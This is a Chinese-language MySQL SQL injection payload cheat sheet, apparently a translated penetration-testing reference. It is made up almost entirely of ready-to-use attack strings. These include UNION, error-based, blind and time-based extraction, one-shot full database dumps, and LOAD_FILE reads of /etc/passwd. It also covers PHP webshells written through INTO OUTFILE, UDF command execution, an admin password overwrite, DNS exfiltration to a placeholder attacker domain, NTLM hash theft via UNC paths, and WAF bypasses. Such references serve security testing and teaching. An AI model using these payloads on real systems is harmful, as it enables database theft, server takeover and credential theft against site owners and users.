---
comments: true

---

## MySQL默认数据库

| 名称               | 描述              |
|--------------------|--------------------------|
| mysql              | 需要root权限 |
| information_schema | 从版本5开始可用 |


## MySQL注释

MySQL注释是SQL代码中的注释，在执行期间会被MySQL服务器忽略。

| 类型                       | 描述                       |
|----------------------------|-----------------------------------|
| `#`                        | Hash注释                      |
| `/* MYSQL注释 */`      | C风格注释                   |
| `/*! MYSQL特殊SQL */` | 特殊SQL                       |
| `/*!32302 10*/`            | 适用于MYSQL版本3.23.02的注释 |
| `--`                       | SQL注释                       |
| `;%00`                     | Nullbyte                          |
| \`                         | 反引号                          |


## MySQL测试注入

* **字符串**：查询类似`SELECT * FROM Table WHERE id = 'FUZZ';`
    ```
    '	False
    ''	True
    "	False
    ""	True
    \	False
    \\	True
    ```

* **数字**：查询类似`SELECT * FROM Table WHERE id = FUZZ;`
    ```ps1
    AND 1	    True
    AND 0	    False
    AND true	True
    AND false	False
    1-false	    如果存在漏洞则返回1
    1-true	    如果存在漏洞则返回0
    1*56	    如果存在漏洞则返回56
    1*56	    如果不存在漏洞则返回1
    ```

* **登录**：查询类似`SELECT * FROM Users WHERE username = 'FUZZ1' AND password = 'FUZZ2';`
    ```ps1
    ' OR '1
    ' OR 1 -- -
    " OR "" = "
    " OR 1 = 1 -- -
    '='
    'LIKE'
    '=0--+'
    ```


## MySQL联合查询注入

### 检测列数

要成功执行基于联合查询的SQL注入，攻击者需要知道原始查询中的列数。


#### 迭代NULL方法

系统地增加`UNION SELECT`语句中的列数，直到负载执行无误或产生可见变化。每次迭代检查列数的兼容性。

```sql
UNION SELECT NULL;--
UNION SELECT NULL, NULL;-- 
UNION SELECT NULL, NULL, NULL;-- 
```


#### ORDER BY方法

持续增加数字，直到得到`False`响应。尽管`GROUP BY`和`ORDER BY`在SQL中的功能不同，但它们都可以以完全相同的方式用来确定查询中的列数。

| ORDER BY        | GROUP BY        | 结果 |
| --------------- | --------------- | ------ |
| `ORDER BY 1--+` | `GROUP BY 1--+` | True   |
| `ORDER BY 2--+` | `GROUP BY 2--+` | True   |
| `ORDER BY 3--+` | `GROUP BY 3--+` | True   |
| `ORDER BY 4--+` | `GROUP BY 4--+` | False  |

由于`ORDER BY 4`的结果为假，这意味着SQL查询只有3列。
在基于`UNION`的SQL注入中，你可以`SELECT`任意数据以在页面上显示：`-1' UNION SELECT 1,2,3--+`。

与前面的方法类似，如果启用了错误显示，我们可以通过一个请求来检查列数。

```sql
ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+ # 'order clause'中的未知列'4'
```


#### LIMIT INTO方法

当启用了错误报告时，此方法有效。它可以确定在LIMIT子句之后发生注入点时的列数。 

| 负载                      | 错误           |
| ---------------------------- | --------------- |
| `1' LIMIT 1,1 INTO @--+`     | `使用的SELECT语句具有不同数量的列` |
| `1' LIMIT 1,1 INTO @,@--+ `  | `使用的SELECT语句具有不同数量的列` |
| `1' LIMIT 1,1 INTO @,@,@--+` | `无错误意味着查询使用3列` |

由于结果未显示任何错误，这意味着查询使用3列：`-1' UNION SELECT 1,2,3--+`。


### 使用information_schema提取数据库

此查询检索服务器上所有架构（数据库）的名称。

```sql
UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,schema_name,0x7c) FROM information_schema.schemata
```

此查询检索指定架构（架构名称由占位符表示）内所有表的名称。

```sql
UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,table_name,0x7C) FROM information_schema.tables WHERE table_schema=占位符
```

此查询检索指定表中所有列的名称。

```sql
UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,column_name,0x7C) FROM information_schema.columns WHERE table_name=...
```

此查询旨在从特定表中检索数据。

```sql
UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,data,0x7C) FROM ...
```


### 不使用information_schema提取列名

适用于`MySQL >= 4.1`的方法。

| 负载 | 输出 |
| --- | --- |
| `(1)and(SELECT * from db.users)=(1)` | 操作数应包含**4**列 |
| `1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)` | 列'**id**'不能为null |

适用于`MySQL 5`的方法。

| 负载 | 输出 |
| --- | --- |
| `UNION SELECT * FROM (SELECT * FROM users JOIN users b)a` | 重复的列名'**id**' |
| `UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a` | 重复的列名'**name**' |
| `UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a` | 数据 |

### 无列名提取数据

在不知道列名的情况下提取第4列的数据。

```sql
SELECT `4` FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)DBNAME;
```

在查询`select author_id,title from posts where author_id=[INJECT_HERE]`中的注入示例：

```sql
MariaDB [dummydb]> SELECT AUTHOR_ID,TITLE FROM POSTS WHERE AUTHOR_ID=-1 UNION SELECT 1,(SELECT CONCAT(`3`,0X3A,`4`) FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)A LIMIT 1,1);
+-----------+-----------------------------------------------------------------+
| author_id | title                                                           |
+-----------+-----------------------------------------------------------------+
|         1 | a45d4e080fc185dfa223aea3d0c371b6cc180a37:veronica80@example.org |
+-----------+-----------------------------------------------------------------+
```


## MySQL基于错误的注入

| 名称         | 负载         |
| ------------ | --------------- |
| GTID_SUBSET  | `AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337) -- -` |
| JSON_KEYS    | `AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('~',(SELECT version()),'~')) USING utf8))) -- -` |
| EXTRACTVALUE | `AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version()),'~')) -- -` |
| UPDATEXML    | `AND UPDATEXML(1337,CONCAT('.','~',(SELECT version()),'~'),31337) -- -` |
| EXP          | `AND EXP(~(SELECT * FROM (SELECT CONCAT('~',(SELECT version()),'~','x'))x)) -- -` |
| OR           | `OR 1 GROUP BY CONCAT('~',(SELECT version()),'~',FLOOR(RAND(0)*2)) HAVING MIN(0) -- -` |
| NAME_CONST   | `AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--` |


### MySQL基于错误的基本方法

适用于`MySQL >= 4.1`

```sql
(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))
'+(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))+' 
```


### MySQL基于错误的UpdateXML函数

```sql
AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)-
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--
```

更简洁的写法：

```sql
updatexml(null,concat(0x0a,version()),null)-- -
updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -
```


### MySQL基于错误的Extractvalue函数

适用于`MySQL >= 5.1`

```sql
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(CHAR(126),VERSION(),CHAR(126)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),table_name,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),data_column,CHAR(126)) FROM data_schema.data_table LIMIT data_offset,1)))--
```


### MySQL基于错误的NAME_CONST函数（仅适用于常量）

适用于`MySQL >= 5.0`

```sql
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(user(),1),NAME_CONST(user(),1)) as x)--
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1)) as x)--
```


## MySQL盲注

### MySQL盲注使用Substring等价物

| 函数 | 示例 | 描述 |
| --- | --- | --- |
| `SUBSTR` | `SUBSTR(version(),1,1)=5` | 从字符串中提取子字符串（从任意位置开始） |
| `SUBSTRING` | `SUBSTRING(version(),1,1)=5` | 从字符串中提取子字符串（从任意位置开始） |
| `RIGHT` | `RIGHT(left(version(),1),1)=5` | 从字符串中提取一定数量的字符（从右侧开始） |
| `MID` | `MID(version(),1,1)=4` | 从字符串中提取子字符串（从任意位置开始） |
| `LEFT` | `LEFT(version(),1)=4` | 从字符串中提取一定数量的字符（从左侧开始） |

使用`SUBSTRING`或其他等价函数的盲注SQL注入示例：

```sql
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'
?id=1 AND ASCII(LOWER(SUBSTR(version(),1,1)))=51
```


### MySQL盲注使用条件语句

* TRUE: `如果 @@version 以 5 开头`：

    ```sql
    2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
    响应：
    HTTP/1.1 500 Internal Server Error
    ```

* FALSE: `如果 @@version 以 4 开头`：

    ```sql
    2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2
    响应：
    HTTP/1.1 200 OK
    ```


### MySQL盲注使用MAKE_SET

```sql
AND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(version()))),1)
AND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(version(),POS,1)),1)
AND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(concat(login,password)))),1)
AND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(concat(login,password),POS,1)),1)
```


### MySQL盲注使用LIKE

在MySQL中，`LIKE`运算符可用于在查询中执行模式匹配。该运算符允许使用通配符字符来匹配未知或部分字符串值。这在盲注SQL注入上下文中特别有用，当攻击者不知道数据库中存储的数据的长度或具体内容时。

LIKE中的通配符字符：

* **百分号** (`%`): 该通配符代表零个、一个或多个字符。它可以用于匹配任何字符序列。
* **下划线** (`_`): 该通配符代表一个字符。当您知道数据的结构但不知道特定位置的字符时，它用于更精确的匹配。

```sql
SELECT cust_code FROM customer WHERE cust_name LIKE 'k__l';
SELECT * FROM products WHERE product_name LIKE '%user_input%'
```


### MySQL盲注使用REGEXP

盲注SQL注入也可以使用MySQL的`REGEXP`运算符来执行，该运算符用于将字符串与正则表达式进行匹配。当攻击者想要执行比`LIKE`运算符更复杂的模式匹配时，这种技术特别有用。

| 负载 | 描述 |
| --- | --- |
| `' OR (SELECT username FROM users WHERE username REGEXP '^.{8,}$') --` | 检查长度 |
| `' OR (SELECT username FROM users WHERE username REGEXP '[0-9]') --`   | 检查数字的存在 |
| `' OR (SELECT username FROM users WHERE username REGEXP '^a[a-z]') --` | 检查以"a"开头的数据 |


## MySQL基于时间的注入

以下SQL代码将延迟MySQL的输出。

* MySQL 4/5 : [`BENCHMARK()`](https://dev.mysql.com/doc/refman/8.4/en/select-benchmarking.html) 
    ```sql
    +BENCHMARK(40000000,SHA1(1337))+
    '+BENCHMARK(3200,SHA1(1))+' 
    AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))
    ```

* MySQL 5: [`SLEEP()`](https://dev.mysql.com/doc/refman/8.4/en/miscellaneous-functions.html#function_sleep) 
    ```sql
    RLIKE SLEEP([SLEEPTIME])
    OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
    XOR(IF(NOW()=SYSDATE(),SLEEP(5),0))XOR
    AND SLEEP(10)=0
    AND (SELECT 1337 FROM (SELECT(SLEEP(10-(IF((1=1),0,10))))) RANDSTR)
    ```

### 在子查询中使用SLEEP

提取数据的长度。

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '%')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '___')# 
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '____')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '_____')#
```

提取第一个字符。

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'A____')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'S____')#
```

提取第二个字符。

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SA___')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SW___')#
```

提取第三个字符。

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWA__')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWB__')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWI__')#
```

提取列名。

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE (SELECT table_name FROM information_schema.columns WHERE table_schema=DATABASE() AND column_name LIKE '%pass%' LIMIT 0,1) LIKE '%')#
```


### 使用条件语句

```sql
?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1)))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --
?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1)))>=100, 1, SLEEP(3)) --
?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
```


## MySQL一次性转储（DIOS）

DIOS（Dump In One Shot）SQL注入是一种高级技术，允许攻击者通过精心设计的SQL注入负载一次性提取整个数据库内容。此方法利用将多个数据片段连接成单个结果集的能力，然后从数据库中一次性返回。

```sql
(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#
(select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] > ',column_data2,' > ',0x7C))))a)#
```

* SecurityIdiots
    ```sql
    make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)
    ```

* Profexer
    ```sql
    (select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)
    ```

* Dr.Z3r0
    ```sql
    (select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@))
    ```

* M@dBl00d
    ```sql
    (Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))
    ```

* Zen
    ```sql
    +make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)
    ```

* sharik
    ```sql
    (select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)
    ```


## MySQL当前查询

`INFORMATION_SCHEMA.PROCESSLIST`是MySQL和MariaDB中一个特殊的表，它提供了数据库服务器中活动进程和线程的信息。此表可以列出数据库当前正在执行的所有操作。

`PROCESSLIST`表包含几个重要的列，每个列都提供了有关当前进程的详细信息。常见列包括： 

* **ID** ：进程标识符。
* **USER** ：运行该进程的MySQL用户。
* **HOST** ：发起该进程的主机。
* **DB** ：该进程当前正在访问的数据库，如果有的话。
* **COMMAND** ：该进程正在执行的命令类型（例如，Query, Sleep）。
* **TIME** ：该进程已运行的时间（秒）。
* **STATE** ：该进程的当前状态。
* **INFO** ：正在执行的语句文本，如果没有正在执行的语句则为NULL。
     
```sql
SELECT * FROM INFORMATION_SCHEMA.PROCESSLIST;
```

| ID  | USER      | HOST 	         | DB 	   | COMMAND | TIME | STATE      | INFO | 
| --- | --------- | ---------------- | ------- | ------- | ----	| ---------- | ---- | 
| 1	  | root	  | localhost        | testdb  | Query	 | 10	| executing	 | SELECT * FROM some_table | 
| 2	  | app_uset  | 192.168.0.101    | appdb   | Sleep	 | 300	| sleeping	 | NULL |
| 3	  | gues_user | example.com:3360 | NULL	   | Connect | 0    | connecting | NULL |


```sql
UNION SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST #
```

一次性转储查询以提取整个表的内容。

```sql
UNION SELECT 1,(SELECT(@)FROM(SELECT(@:=0X00),(SELECT(@)FROM(information_schema.processlist)WHERE(@)IN(@:=CONCAT(@,0x3C62723E,state,0x3a,info))))a),3,4 #
```


## MySQL读取文件内容

需要`filepriv`权限，否则会报错：`ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement`

```sql
UNION ALL SELECT LOAD_FILE('/etc/passwd') -- 
UNION ALL SELECT TO_base64(LOAD_FILE('/var/www/html/index.php'));
```

如果你是数据库的`root`用户，可以使用以下查询重新启用`LOAD_FILE`

```sql
GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#
```

## MySQL命令执行

### WEBSHELL - OUTFILE方法

```sql
[...] UNION SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
[...] UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>'
[...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\wamp\\www\\pwnd.php'-- - 
[...] union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
```

### WEBSHELL - DUMPFILE方法

```sql
[...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPFILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'
[...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';
```

### COMMAND - UDF库

首先需要检查服务器上是否安装了UDF。

```powershell
$ whereis lib_mysqludf_sys.so
/usr/lib/lib_mysqludf_sys.so
```

然后可以使用`sys_exec`和`sys_eval`等函数。

```sql
$ mysql -u root -p mysql
Enter password: [...]

mysql> SELECT sys_eval('id');
+--------------------------------------------------+
| sys_eval('id') |
+--------------------------------------------------+
| uid=118(mysql) gid=128(mysql) groups=128(mysql) |
+--------------------------------------------------+
```


## MySQL插入

`ON DUPLICATE KEY UPDATE`关键字用于告诉MySQL当应用程序尝试插入已经存在于表中的行时应该怎么做。我们可以利用这个来更改管理员密码：

使用负载进行注入：

```sql
attacker_dummy@example.com", "P@ssw0rd"), ("admin@example.com", "P@ssw0rd") ON DUPLICATE KEY UPDATE password="P@ssw0rd" --
```

查询将如下所示：

```sql
INSERT INTO users (email, password) VALUES ("attacker_dummy@example.com", "BCRYPT_HASH"), ("admin@example.com", "P@ssw0rd") ON DUPLICATE KEY UPDATE password="P@ssw0rd" -- ", "BCRYPT_HASH_OF_YOUR_PASSWORD_INPUT");
```

此查询将为用户"attacker_dummy@example.com"插入一行。它还将为用户"admin@example.com"插入一行。

由于这一行已经存在，`ON DUPLICATE KEY UPDATE`关键字告诉MySQL将已经存在的行的`password`列更新为"P@ssw0rd"。之后，我们可以简单地使用"admin@example.com"和密码"P@ssw0rd"进行身份验证。


## MySQL截断

在MySQL中"`admin `"和"`admin`"是相同的。如果数据库中的用户名列有字符限制，多余的字符将被截断。因此，如果数据库的列限制为20个字符，而我们输入了一个21个字符的字符串，最后一个字符将被删除。

```sql
`username` varchar(20) not null
```

负载：`username = "admin               a"`


## MySQL带外攻击

```powershell
SELECT @@version INTO OUTFILE '\\\\192.168.0.100\\temp\\out.txt';
SELECT @@version INTO DUMPFILE '\\\\192.168.0.100\\temp\\out.txt;
```

### DNS数据泄露

```sql
SELECT LOAD_FILE(CONCAT('\\\\',VERSION(),'.hacker.site\\a.txt'));
SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,VERSION(),0x2e6861636b65722e736974655c5c612e747874))
```

### UNC路径 - NTLM哈希窃取

“UNC路径”一词指的是用于指定网络上资源（如共享文件或设备）位置的通用命名约定路径。它通常用于Windows环境，通过格式如`\\server\share\file`通过网络访问文件。

```sql
SELECT LOAD_FILE('\\\\error\\abc');
SELECT LOAD_FILE(0x5c5c5c5c6572726f725c5c616263);
SELECT '' INTO DUMPFILE '\\\\error\\abc';
SELECT '' INTO OUTFILE '\\\\error\\abc';
LOAD DATA INFILE '\\\\error\\abc' INTO TABLE DATABASE.TABLE_NAME;
```

:warning: 不要忘记转义'\\\\'。


## MySQL绕过WAF

### Information Schema的替代品

`information_schema.tables`的替代品

```sql
SELECT * FROM mysql.innodb_table_stats;
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
| database_name  | table_name            | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
| dvwa           | guestbook             | 2017-01-19 21:02:57 |      0 |                    1 |                        0 |
| dvwa           | users                 | 2017-01-19 21:03:07 |      5 |                    1 |                        0 |
...
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+

mysql> SHOW TABLES IN dvwa;
+----------------+
| Tables_in_dvwa |
+----------------+
| guestbook      |
| users          |
+----------------+
```


### VERSION的替代品

```sql
mysql> SELECT @@innodb_version;
+------------------+
| @@innodb_version |
+------------------+
| 5.6.31           |
+------------------+

mysql> SELECT @@version;
+-------------------------+
| @@version               |
+-------------------------+
| 5.6.31-0ubuntu0.15.10.1 |
+-------------------------+

mysql> SELECT version();
+-------------------------+
| version()               |
+-------------------------+
| 5.6.31-0ubuntu0.15.10.1 |
+-------------------------+

mysql> SELECT @@GLOBAL.VERSION;
+------------------+
| @@GLOBAL.VERSION |
+------------------+
| 8.0.27           |
+------------------+
```


### GROUP_CONCAT的替代品

要求：`MySQL >= 5.7.22`

使用`json_arrayagg()`代替`group_concat()`，允许显示更少的符号
* `group_concat()` = 1024个符号
* `json_arrayagg()` > 16,000,000个符号

```sql
SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES;
```


### 科学计数法

在MySQL中，e表示法用于表示科学计数法中的数字。这是一种以简洁格式表示非常大或非常小数字的方法。e表示法由一个数字后跟字母e和一个指数组成。
格式为：`base 'e' exponent`。

例如：

* `1e3` 表示 `1 x 10^3`，即 `1000`。 
* `1.5e3` 表示 `1.5 x 10^3`，即 `1500`。 
* `2e-3` 表示 `2 x 10^-3`，即 `0.002`。 

以下查询是等效的：

* `SELECT table_name FROM information_schema 1.e.tables` 
* `SELECT table_name FROM information_schema .tables` 

同样地，常见的绕过认证负载 `' or ''='` 等效于 `' or 1.e('')='` 和 `1' or 1.e(1) or '1'='1`。 
这种技术可以用来混淆查询以绕过WAF，例如：`1.e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 or'1'='2`


### 条件注释

MySQL条件注释包含在 `/*! ... */` 中，可以包含一个版本号，以指定应执行包含代码的MySQL的最低版本。
如果MySQL版本高于或等于 `/*!` 后面立即跟随的数字，则将执行此注释内的代码。如果MySQL版本低于指定数字，则将忽略注释内的代码。 

* `/*!12345UNION*/`：这意味着如果MySQL版本为12.345或更高，则将执行SQL语句中的UNION关键字。
* `/*!31337SELECT*/`：同样地，如果MySQL版本为31.337或更高，则将执行SELECT关键字。

**示例**：`/*!12345UNION*/`, `/*!31337SELECT*/`


### 宽字节注入（GBK）

宽字节注入是一种特定类型的SQL注入攻击，针对使用多字节字符集的应用程序，如GBK或SJIS。术语“宽字节”指的是字符编码，其中一个字符可以用多个字节表示。当应用程序和数据库对多字节序列的解释不同时，这种注入特别相关。

可以利用 `SET NAMES gbk` 查询进行基于字符集的SQL注入攻击。当字符集设置为GBK时，某些多字节字符可以用来绕过转义机制并注入恶意SQL代码。

可以使用几个字符来触发注入。

* `%bf%27`：这是字节序列 `0xbf27` 的URL编码表示。在GBK字符集中，`0xbf27` 解码为一个有效的多字节字符，后面跟着一个单引号（'）。当MySQL遇到此序列时，它将其解释为一个有效的GBK字符，后面跟着一个单引号，有效地结束了字符串。
* `%bf%5c`：表示字节序列 `0xbf5c`。在GBK中，这解码为一个有效的多字节字符，后面跟着一个反斜杠（`\`）。这可以用来转义序列中的下一个字符。
* `%a1%27`：表示字节序列 `0xa127`。在GBK中，这解码为一个有效的多字节字符，后面跟着一个单引号（'）。

可以创建许多负载，例如：

```sql
%A8%27 OR 1=1;--
%8C%A8%27 OR 1=1--
%bf' OR 1=1 -- --
```

以下是一个使用GBK编码并过滤用户输入以转义反斜杠、单引号和双引号的PHP示例。

```php
function check_addslashes($string)
{
    $string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);          //转义任何反斜杠
    $string = preg_replace('/\'/i', '\\\'', $string);                               //用反斜杠转义单引号
    $string = preg_replace('/\"/', "\\\"", $string);                                //用反斜杠转义双引号
      
    return $string;
}

$id=check_addslashes($_GET['id']);
mysql_query("SET NAMES gbk");
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
print_r(mysql_error());
```

以下是宽字节注入的工作原理：

例如，如果输入是 `?id=1'`，PHP将添加一个反斜杠，导致SQL查询变为：`SELECT * FROM users WHERE id='1\'' LIMIT 0,1`。

然而，当在单引号前引入序列 `%df`，如 `?id=1%df'`，PHP仍然添加反斜杠。这导致SQL查询变为：`SELECT * FROM users WHERE id='1%df\'' LIMIT 0,1`。 

在GBK字符集中，序列 `%df%5c` 转换为字符 `連`。因此，SQL查询变为：`SELECT * FROM users WHERE id='1連'' LIMIT 0,1`。在这里，宽字节字符 `連` 有效地“吃掉”了添加的转义字符，允许进行SQL注入。

因此，使用负载 `?id=1%df' and 1=1 --+`，在PHP添加反斜杠后，SQL查询变为：`SELECT * FROM users WHERE id='1連' and 1=1 --+' LIMIT 0,1`。这个修改后的查询可以成功注入，绕过预期的SQL逻辑。


## 参考文献

- [[SQLi] 在不知道列名的情况下提取数据 - Ahmed Sultan - 2019年2月9日](https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/) 
- [MySQL中的科学记数法漏洞使AWS WAF客户易受SQL注入攻击 - Marc Olivier Bergeron - 2021年10月19日](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/) 
- [MySQL中Information_Schema.Tables的替代方案 - Osanda Malith Jayathissa - 2017年2月3日](https://osandamalith.com/2017/02/03/alternative-for-information_schema-tables-in-mysql/) 
- [Ekoparty CTF 2016 (Web 100) - p4-team - 2016年10月26日](https://github.com/p4-team/ctf/tree/master/2016-10-26-ekoparty/web_100) 
- [基于错误的注入 | NetSPI SQL注入维基 - NetSPI - 2021年2月15日](https://sqlwiki.netspi.com/injectionTypes/errorBased) 
- [如何使用SQL调用保护您的网站 - IPA ISEC - 2010年3月](https://www.ipa.go.jp/security/vuln/ps6vr70000011hc4-att/000017321.pdf) 
- [MySQL带外攻击 - Osanda Malith Jayathissa - 2018年2月23日](https://www.exploit-db.com/docs/english/41273-mysql-out-of-band-hacking.pdf) 
- [SQL截断攻击 - Rohit Shaw - 2014年6月29日](https://resources.infosecinstitute.com/sql-truncation-attack/) 
- [SQLi过滤规避备忘单 (MySQL) - Johannes Dahse - 2010年12月4日](https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/) 
- [SQL注入知识库 - Roberto Salgado - 2013年5月29日](https://websec.ca/kb/sql_injection#MySQL_Default_Databases)